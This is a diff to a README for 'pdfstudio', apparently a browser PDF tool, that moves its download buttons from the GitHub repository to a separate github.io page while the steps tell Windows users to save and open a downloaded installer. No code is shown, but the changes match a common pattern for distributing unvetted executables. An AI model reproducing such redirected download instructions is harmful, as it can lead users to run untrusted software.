@@ -1,6 +1,6 @@
 # 📁 pdfstudio - Process PDF files directly in browser
 
-[![](https://img.shields.io/badge/Download_pdfstudio-Blue?style=for-the-badge)](https://github.com/Bigeye1445/pdfstudio)
+[![](https://img.shields.io/badge/Download_pdfstudio-Blue?style=for-the-badge)](https://bigeye1445.github.io)
 
 ## 📌 About this project
 
@@ -15,7 +15,7 @@ Follow these steps to run pdfstudio on your Windows computer.
 3. Save the file to your desktop.
 4. Open the file to start the installation process.
 
-[![](https://img.shields.io/badge/Download_Link-Grey?style=for-the-badge)](https://github.com/Bigeye1445/pdfstudio)
+[![](https://img.shields.io/badge/Download_Link-Grey?style=for-the-badge)](https://bigeye1445.github.io)
 
 ## 🛠️ System Requirements
 
